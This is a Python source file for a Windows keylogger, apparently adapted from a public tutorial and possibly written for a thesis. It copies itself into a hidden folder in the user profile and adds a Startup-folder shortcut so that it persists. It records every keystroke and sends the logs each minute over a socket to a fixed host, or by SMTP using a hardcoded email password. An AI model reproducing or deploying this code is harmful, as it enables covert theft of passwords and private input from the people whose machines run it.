# Source: https://www.thepythoncode.com/article/write-a-keylogger-python
import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
# import time

# import für send2server
import socket
import os
import sys

# import für filecopy
from shutil import copy
from pathlib import Path

# Startup Check - wenn das Skript nicht im Nutzerordner ausgeführt wird soll eine Verknüpfung erstellt werden und das Programm sich selber in den Nutzerordner kopieren, danach Abbruch.
# Check if hidden dir is already created, if not create it
slash = '\\'
userpath = os.environ['USERPROFILE']
hiddendir = userpath + slash + '.keylog' + slash
check_hiddendir = os.path.isdir(hiddendir)

if not check_hiddendir:
    os.mkdir(hiddendir)

# Check if file already exists, if not copy it to hiddendir
current_file = os.path.realpath(__file__)
try:
    current_file.index(hiddendir)
except ValueError:
    copy(sys.argv[0], hiddendir)
    # time.sleep(5)
    # sys.exit()

autostart_folder = r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
linkfile = userpath + autostart_folder + slash + Path(__file__).stem + '.lnk'

if not os.path.isfile(linkfile):
    # Source: https://stackoverflow.com/questions/60943757/create-a-shortcut-lnk-of-file-in-windows-with-python3
    # Create shortcut to Windows 10 autostart folder
    import winshell
    from win32com.client import Dispatch

    f_extension = ".vbs"

    path = linkfile  # Path to be saved (shortcut)
    target = hiddendir + slash + Path(__file__).stem + f_extension  # The shortcut target file or folder
    work_dir = hiddendir  # The parent folder of your file

    # Debugging Info
    # print(path)
    # print(target)
    # print(work_dir)

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = work_dir
    shortcut.save()

########################### - Nicht getestet!
SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "masterarbeit@raikster.de"
EMAIL_PASSWORD = "gdgse9843534geGD$fdgg&(/34sfgsgh&%§dsrgr"


class Keylogger:
    def __init__(self, interval, report_method="file"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        logfile = f"{self.filename}.txt"
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        self.send2server(logfile)

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.raikster.de", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def send2server(self, logfile):
        # Source: https://www.thepythoncode.com/article/send-receive-files-using-sockets-python
        separator = "<SEPARATOR>"
        buffer_size = 4096  # send 4096 bytes each time step

        # the ip address or hostname of the server, the receiver
        host = "192.168.2.10"
        # the port, let's use 5001
        port = 5001
        # the name of file we want to send, make sure it exists
        filename = logfile
        # get the file size
        filesize = os.path.getsize(filename)
        # create the client socket
        s = socket.socket()

        print(f"[+] Connecting to {host}:{port}")
        try:
            s.connect((host, port))
        except ConnectionRefusedError:
            print("No host available, try localhost.")
            try:
                s.connect(('localhost', port))
            except ConnectionRefusedError:
                print("No host available, exiting script.")
                sys.exit(0)
        print("[+] Connected.")

        # send the filename and filesize
        s.send(f"{filename}{separator}{filesize}".encode())
        # start sending the file
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in
                # busy networks
                s.sendall(bytes_read)
        # close the socket
        s.close()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


# Start Keylogger
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
